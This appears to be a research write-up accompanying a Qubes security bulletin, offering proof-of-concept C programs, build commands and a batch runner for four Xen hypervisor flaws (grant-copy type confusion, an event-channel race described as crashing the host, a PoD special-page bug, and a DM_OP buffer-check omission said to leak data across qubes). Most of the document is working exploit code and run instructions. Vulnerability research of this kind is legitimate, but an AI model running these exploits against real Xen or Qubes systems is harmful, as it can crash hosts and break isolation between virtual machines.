---
title: "QSB-116: Xen Vulnerabilities (XSA-500/505/506/507) — Research PoCs"
description: "Research PoCs and a batch runner for the Xen vulnerabilities covered by QSB-116."
date: 2026-07-29
---

On 2026-07-28, the Qubes Security Team published [QSB-116](https://github.com/QubesOS/qubes-secpack/blob/f9001423ffb11de26bdcf0b4478838739cc3f6b3/QSBs/qsb-116-2026.txt), covering four Xen vulnerabilities disclosed the same day:

| XSA | CVE | Title | Xen Versions Affected | Default Qubes Config |
|-----|-----|-------|---------------------|---------------------|
| XSA-500 | CVE-2026-62428 | grant-table: type confusion in grant-copy | ≥ 4.2 | Affected |
| XSA-505 | CVE-2026-62432 | evtchn: Race between FIFO expand and reset | ≥ 4.5 | Stubdomains only (QEMU needed first) |
| XSA-506 | CVE-2026-62433 | correct buffer checks for DM_OP hypercalls | ≥ 4.10 | Untrusted HVM qubes |
| XSA-507 | CVE-2026-62434 | PoD: Don't try to reclaim special pages | ≥ 3.4 | Affected with relevant memory-balancing configuration |

These are research PoCs using `privcmd` ioctls and Xen headers, without a `libxenctrl` dependency. A successful build or a timeout is not evidence that a vulnerability was triggered; record the Xen version, guest configuration, return code, and Xen log for every run.

## XSA-505: evtchn FIFO expand/reset race

Two threads race `EVTCHNOP_expand_array` against `EVTCHNOP_reset`. On unpatched Xen 4.5+, this triggers a NULL pointer dereference in the hypervisor, crashing the entire system.

**Interpretation**: on an unpatched target with FIFO event channels enabled, a host failure is a possible outcome. A process timeout alone is inconclusive.

```c
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <fcntl.h>
#include <errno.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <xen/xen.h>
#include <xen/event_channel.h>

struct privcmd_hypercall { uint64_t op; uint64_t arg[5]; };
#define IOCTL_PRIVCMD_HYPERCALL \
    _IOC(_IOC_NONE, 'P', 0, sizeof(struct privcmd_hypercall))

static int privcmd_fd;
static long hypercall(unsigned int nr, unsigned long a1, unsigned long a2,
                      unsigned long a3, unsigned long a4, unsigned long a5)
{
    struct privcmd_hypercall h = { .op = nr, .arg = { a1, a2, a3, a4, a5 } };
    return ioctl(privcmd_fd, IOCTL_PRIVCMD_HYPERCALL, &h);
}

static volatile int running = 1;

void *expand_thread(void *arg)
{
    struct evtchn_expand_array expand;
    void *page = mmap(NULL, 4096, PROT_READ | PROT_WRITE,
                      MAP_PRIVATE | MAP_ANONYMOUS | MAP_LOCKED, -1, 0);
    if (page == MAP_FAILED) { perror("mmap"); return NULL; }
    memset(page, 0, 4096);
    expand.array_gfn = ((uint64_t)(uintptr_t)page) >> 12;
    while (running)
        hypercall(__HYPERVISOR_event_channel_op,
                  12, (unsigned long)&expand, 0, 0, 0);
    return NULL;
}

void *reset_thread(void *arg)
{
    struct evtchn_reset reset = { .dom = DOMID_SELF };
    while (running)
        hypercall(__HYPERVISOR_event_channel_op,
                  10, (unsigned long)&reset, 0, 0, 0);
    return NULL;
}

int main(void)
{
    pthread_t et, rt;
    privcmd_fd = open("/dev/xen/privcmd", O_RDWR);
    if (privcmd_fd < 0) { perror("open"); return 1; }
    printf("[*] XSA-505 PoC: evtchn FIFO expand/reset race\n");
    printf("[*] WARNING: this is a destructive research test.\n");
    pthread_create(&et, NULL, expand_thread, NULL);
    pthread_create(&rt, NULL, reset_thread, NULL);
    sleep(60);
    running = 0;
    pthread_join(et, NULL); pthread_join(rt, NULL);
    close(privcmd_fd);
    printf("[*] Done. Review the Xen log before drawing conclusions.\n");
    return 0;
}
```

**Build and run:**
```bash
gcc -O2 -Wall -o xsa505-poc xsa505-poc.c -lpthread
sudo ./xsa505-poc
```

---

## XSA-500: grant-table type confusion

This PoC uses two threads to race a `GNTTABOP_copy` against concurrent grant table `unmap`/`map` operations. The race condition makes Xen perform permission checks on one page while copying to another, enabling type confusion.

```c
#define __XEN_INTERFACE_VERSION__ 0x00030209

#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <fcntl.h>
#include <errno.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <xen/xen.h>
#include <xen/grant_table.h>

struct privcmd_hypercall { uint64_t op; uint64_t arg[5]; };
#define IOCTL_PRIVCMD_HYPERCALL \
    _IOC(_IOC_NONE, 'P', 0, sizeof(struct privcmd_hypercall))

static int privcmd_fd;
static long hypercall(unsigned int nr, unsigned long a1, unsigned long a2,
                      unsigned long a3, unsigned long a4, unsigned long a5)
{
    struct privcmd_hypercall h = { .op = nr, .arg = { a1, a2, a3, a4, a5 } };
    return ioctl(privcmd_fd, IOCTL_PRIVCMD_HYPERCALL, &h);
}

struct ioctl_gntdev_grant_ref { uint32_t domid; uint32_t ref; };
struct ioctl_gntdev_map_grant_ref {
    uint32_t count; uint32_t pad; uint64_t index;
    struct ioctl_gntdev_grant_ref refs[1];
};
#define IOCTL_GNTDEV_MAP_GRANT_REF \
    _IOC(_IOC_NONE, 'G', 0, sizeof(struct ioctl_gntdev_map_grant_ref))

#define PAGE_SIZE  4096
#define GRANT_REF  0

static volatile int running = 1;
static void *page1, *page2;
static int gntdev_fd;

void *copy_thread(void *arg)
{
    void *dst = mmap(NULL, PAGE_SIZE, PROT_READ | PROT_WRITE,
                     MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (dst == MAP_FAILED) { perror("mmap dst"); return NULL; }
    while (running) {
        struct gnttab_copy c;
        memset(&c, 0, sizeof(c));
        c.source.u.ref  = GRANT_REF;
        c.source.domid  = DOMID_SELF;
        c.source.offset = 0;
        c.dest.u.gmfn   = ((uint64_t)(uintptr_t)dst) >> 12;
        c.dest.domid    = DOMID_SELF;
        c.dest.offset   = 0;
        c.len           = 64;
        c.flags         = GNTCOPY_source_gref;
        hypercall(__HYPERVISOR_grant_table_op,
                  GNTTABOP_copy, (unsigned long)&c, 1, 0, 0);
    }
    return NULL;
}

void *remap_thread(void *arg)
{
    struct gnttab_unmap_grant_ref un;
    struct gnttab_map_grant_ref map;
    void *pages[2] = { page1, page2 };
    int toggle = 0;
    grant_handle_t handle = 0;
    while (running) {
        memset(&un, 0, sizeof(un));
        un.host_addr = (uint64_t)(uintptr_t)pages[toggle];
        un.handle    = handle;
        hypercall(__HYPERVISOR_grant_table_op,
                  GNTTABOP_unmap_grant_ref, (unsigned long)&un, 1, 0, 0);
        memset(&map, 0, sizeof(map));
        map.host_addr = (uint64_t)(uintptr_t)pages[1 - toggle];
        map.ref       = GRANT_REF;
        map.dom       = DOMID_SELF;
        hypercall(__HYPERVISOR_grant_table_op,
                  GNTTABOP_map_grant_ref, (unsigned long)&map, 1, 0, 0);
        handle = map.handle;
        toggle = 1 - toggle;
    }
    return NULL;
}

int main(void)
{
    pthread_t ct, rt;
    privcmd_fd = open("/dev/xen/privcmd", O_RDWR);
    gntdev_fd  = open("/dev/xen/gntdev", O_RDWR);
    if (privcmd_fd < 0 || gntdev_fd < 0) { perror("open"); return 1; }
    page1 = mmap(NULL, PAGE_SIZE, PROT_READ|PROT_WRITE,
                 MAP_PRIVATE|MAP_ANONYMOUS|MAP_LOCKED, -1, 0);
    page2 = mmap(NULL, PAGE_SIZE, PROT_READ|PROT_WRITE,
                 MAP_PRIVATE|MAP_ANONYMOUS|MAP_LOCKED, -1, 0);
    memset(page1, 0x41, PAGE_SIZE); memset(page2, 0x42, PAGE_SIZE);

    struct ioctl_gntdev_map_grant_ref gm = { .count = 1 };
    gm.refs[0].domid = DOMID_SELF; gm.refs[0].ref = GRANT_REF;
    if (ioctl(gntdev_fd, IOCTL_GNTDEV_MAP_GRANT_REF, &gm) < 0)
        { perror("gntdev map"); return 1; }

    printf("[*] XSA-500 PoC: grant-copy type confusion\n");
    pthread_create(&ct, NULL, copy_thread, NULL);
    pthread_create(&rt, NULL, remap_thread, NULL);
    sleep(120); running = 0;
    pthread_join(ct, NULL); pthread_join(rt, NULL);
    close(gntdev_fd); close(privcmd_fd);
    return 0;
}
```

**Build and run:**
```bash
gcc -O2 -Wall -o xsa500-poc xsa500-poc.c -lpthread
sudo ./xsa500-poc
```

---

## XSA-507: PoD special pages reclaim

A guest with Populate-on-Demand enabled (HVM/PVH, `maxmem > memory`) reclaims non-RAM pages. Unpatched Xen mishandles special pages (like `shared_info`) during `XENMEM_decrease_reservation`.

```c
#define __XEN_INTERFACE_VERSION__ 0x00030209

#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <xen/xen.h>
#include <xen/memory.h>

struct privcmd_hypercall { uint64_t op; uint64_t arg[5]; };
#define IOCTL_PRIVCMD_HYPERCALL \
    _IOC(_IOC_NONE, 'P', 0, sizeof(struct privcmd_hypercall))

static int privcmd_fd;
static long hypercall(unsigned int nr, unsigned long a1, unsigned long a2,
                      unsigned long a3, unsigned long a4, unsigned long a5)
{
    struct privcmd_hypercall h = { .op = nr, .arg = { a1, a2, a3, a4, a5 } };
    return ioctl(privcmd_fd, IOCTL_PRIVCMD_HYPERCALL, &h);
}

#define NR_PAGES 256

int main(void)
{
    int ret, i, round;
    xen_pfn_t *pfns;

    privcmd_fd = open("/dev/xen/privcmd", O_RDWR);
    if (privcmd_fd < 0) { perror("open"); return 1; }
    pfns = calloc(NR_PAGES, sizeof(xen_pfn_t));
    if (!pfns) { perror("calloc"); return 1; }

    printf("[*] XSA-507 PoC: PoD special pages reclaim\n");

    for (round = 0; round < 1000; round++) {
        struct xen_memory_reservation inc;
        memset(&inc, 0, sizeof(inc));
        set_xen_guest_handle(inc.extent_start, pfns);
        inc.nr_extents   = NR_PAGES;
        inc.extent_order = 0;
        inc.mem_flags    = 0;
        inc.domid        = DOMID_SELF;

        ret = (int)hypercall(__HYPERVISOR_memory_op,
                             XENMEM_increase_reservation,
                             (unsigned long)&inc, 0, 0, 0);
        if (ret != NR_PAGES) {
            struct xen_memory_reservation dec;
            memset(&dec, 0, sizeof(dec));
            set_xen_guest_handle(dec.extent_start, pfns);
            dec.nr_extents = NR_PAGES; dec.extent_order = 0;
            dec.mem_flags = 0; dec.domid = DOMID_SELF;
            hypercall(__HYPERVISOR_memory_op, XENMEM_decrease_reservation,
                      (unsigned long)&dec, 0, 0, 0);
            memset(pfns, 0, NR_PAGES * sizeof(xen_pfn_t));
            continue;
        }
        for (i = 0; i < NR_PAGES && pfns[i] != 0; i++) {
            void *p = mmap(NULL, 4096, PROT_READ|PROT_WRITE,
                           MAP_SHARED, privcmd_fd, 0);
            if (p != MAP_FAILED) { memset(p, 0x42, 4096); munmap(p, 4096); }
        }

        struct xen_memory_reservation dec;
        memset(&dec, 0, sizeof(dec));
        set_xen_guest_handle(dec.extent_start, pfns);
        dec.nr_extents = NR_PAGES; dec.extent_order = 0;
        dec.mem_flags = 0; dec.domid = DOMID_SELF;
        ret = (int)hypercall(__HYPERVISOR_memory_op, XENMEM_decrease_reservation,
                             (unsigned long)&dec, 0, 0, 0);
        memset(pfns, 0, NR_PAGES * sizeof(xen_pfn_t));
        if (round % 100 == 0) printf("  Round %d\n", round);
    }
    free(pfns); close(privcmd_fd);
    printf("[*] Done.\n");
    return 0;
}
```

**Prerequisites:**
```bash
qvm-shutdown <qube>
qvm-prefs <qube> virt_mode hvm
qvm-prefs <qube> memory 2048
qvm-prefs <qube> maxmem 4096
qvm-start <qube>
```

**Build and run:**
```bash
gcc -O2 -Wall -o xsa507-poc xsa507-poc.c
sudo ./xsa507-poc
```

---

## XSA-506: DM_OP buffer check omission

Calls `XEN_DMOP_modified_memory` with `nr_bufs=1` (it requires 2). On unpatched Xen, `buf[1]` reads uninitialized stack data — a side-channel info leak across qubes.

Must run from dom0 or a stubdomain targeting an HVM domain.

```c
#define __XEN_INTERFACE_VERSION__ 0x00030209

#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <sys/ioctl.h>

struct privcmd_dm_op_buf { void *uptr; size_t size; };
struct privcmd_dm_op {
    uint16_t dom; uint16_t pad; uint32_t num;
    const struct privcmd_dm_op_buf *ubufs;
};
#define IOCTL_PRIVCMD_DM_OP _IOC(_IOC_NONE, 'P', 5, sizeof(struct privcmd_dm_op))

struct __attribute__((packed)) xen_dm_op_modified_memory {
    uint32_t nr_extents; uint32_t opaque;
};
struct xen_dm_op_modified_memory_extent {
    uint32_t nr; uint32_t pad; uint64_t first_pfn;
};
struct __attribute__((packed)) xen_dm_op {
    uint32_t op; uint32_t pad;
    union { struct xen_dm_op_modified_memory mm; char _pad[64]; } u;
};
#define XEN_DMOP_modified_memory 11

int main(int argc, char *argv[])
{
    int fd; uint16_t domid;
    if (argc < 2) {
        fprintf(stderr, "Usage: %s <domid>\n", argv[0]); return 1;
    }
    domid = (uint16_t)atoi(argv[1]);

    fd = open("/dev/xen/privcmd", O_RDWR);
    if (fd < 0) { perror("open"); return 1; }

    struct xen_dm_op op;
    memset(&op, 0, sizeof(op));
    op.op = XEN_DMOP_modified_memory;

    struct xen_dm_op_modified_memory_extent extent;
    memset(&extent, 0, sizeof(extent));
    extent.nr = 1;
    extent.first_pfn = 0x100000 >> 12;

    struct privcmd_dm_op_buf buf[1];
    buf[0].uptr = &extent;
    buf[0].size = sizeof(extent);

    struct privcmd_dm_op dm = { .dom = domid, .num = 1, .ubufs = buf };

    printf("[*] XSA-506 PoC: target domid=%u\n", domid);
    for (int i = 0; i < 100; i++) {
        int ret = ioctl(fd, IOCTL_PRIVCMD_DM_OP, &dm);
        printf("Round %3d: ret=%d (%s)\n", i, ret,
               ret < 0 ? strerror(errno) : "unexpected");
    }
    close(fd);
    return 0;
}
```

**Build and run (from dom0):**
```bash
gcc -O2 -Wall -o xsa506-poc xsa506-poc.c
sudo ./xsa506-poc $(xl list | grep -i hvm | awk '{print $2}' | head -1)
```

**Interpretation:** `ioctl()` reports an error as `-1` and sets `errno`. Record `errno` for each round. A consistent `EINVAL` is compatible with the patched buffer-count check; mixed `EINVAL` and `EFAULT` requires Xen-log and environment evidence before it is treated as a positive result.

---

## Batch Runner

Place `xsa500-poc`, `xsa505-poc`, and `xsa507-poc` in `~/qsb-116` inside a prepared test qube. Build `xsa506-poc` in the current directory on dom0, then run:

```bash
RUN_EXPERIMENTS=1 ./run-all-poc.sh <test-qube> <hvm-domid>
```

```bash
#!/usr/bin/env bash
set -u

if [ "${RUN_EXPERIMENTS:-}" != "1" ] || [ "$#" -ne 2 ]; then
    echo "usage: RUN_EXPERIMENTS=1 $0 <test-qube> <hvm-domid>" >&2
    exit 64
fi

test_qube=$1
hvm_domid=$2
log_dir="qsb-116-logs-$(date +%Y%m%d-%H%M%S)"
mkdir -p "$log_dir"

run_guest() {
    local name=$1
    local seconds=$2
    timeout "$seconds" qvm-run --pass-io "$test_qube" \
        "cd ~/qsb-116 && sudo ./$name" \
        >"$log_dir/$name.out" 2>&1
    printf '%s\n' "$?" >"$log_dir/$name.status"
}

xl dmesg >"$log_dir/xen-before.log" 2>&1 || true
run_guest xsa500-poc 120
run_guest xsa505-poc 60
run_guest xsa507-poc 300
timeout 30 sudo ./xsa506-poc "$hvm_domid" >"$log_dir/xsa506-poc.out" 2>&1
printf '%s\n' "$?" >"$log_dir/xsa506-poc.status"
xl dmesg >"$log_dir/xen-after.log" 2>&1 || true
echo "results: $log_dir"
```

`124` in a status file means the local timeout expired. It is not a positive vulnerability result.

## Notes

The kernel-side Xen interface is accessed through:

- `/dev/xen/privcmd` — `ioctl(IOCTL_PRIVCMD_HYPERCALL)` for direct hypercall invocation
- `/dev/xen/gntdev` — `ioctl(IOCTL_GNTDEV_MAP_GRANT_REF)` for grant table setup
- `/dev/xen/privcmd` — `ioctl(IOCTL_PRIVCMD_DM_OP)` for device model operations

## References

- [QSB-116](https://github.com/QubesOS/qubes-secpack/blob/f9001423ffb11de26bdcf0b4478838739cc3f6b3/QSBs/qsb-116-2026.txt)
- [XSA-500](https://xenbits.xen.org/xsa/advisory-500.html) — [patch](https://xenbits.xen.org/xsa/xsa500.patch)
- [XSA-505](https://xenbits.xen.org/xsa/advisory-505.html) — [patch](https://xenbits.xen.org/xsa/xsa505.patch)
- [XSA-506](https://xenbits.xen.org/xsa/advisory-506.html) — [patch](https://xenbits.xen.org/xsa/xsa506.patch)
- [XSA-507](https://xenbits.xen.org/xsa/advisory-507.html) — [patch](https://xenbits.xen.org/xsa/xsa507.patch)
